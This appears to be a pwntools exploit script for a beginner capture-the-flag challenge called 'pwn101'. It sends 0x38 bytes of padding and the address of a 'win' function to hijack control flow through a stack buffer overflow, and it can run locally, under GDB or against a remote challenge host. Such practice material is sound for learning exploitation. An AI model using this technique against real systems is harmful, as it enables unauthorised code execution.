from pwn import *


# initialize the binary
binary = "./pwn101"
elf = context.binary = ELF(binary, checksec=False)

gs = """
break *(vuln+30)
continue
"""

if args.REMOTE:
    p = remote("pwn101.youcanhack.me", 1337)
elif args.GDB:
    context.terminal = ["tmux", "splitw", "-h"]
    p = gdb.debug(binary, gdbscript=gs)
else:
    p = elf.process()


# send payload
payload = flat(
    b"A"*0x38,              # padding
    p64(elf.sym["win"])     # win function
)
p.sendline(payload)

p.interactive()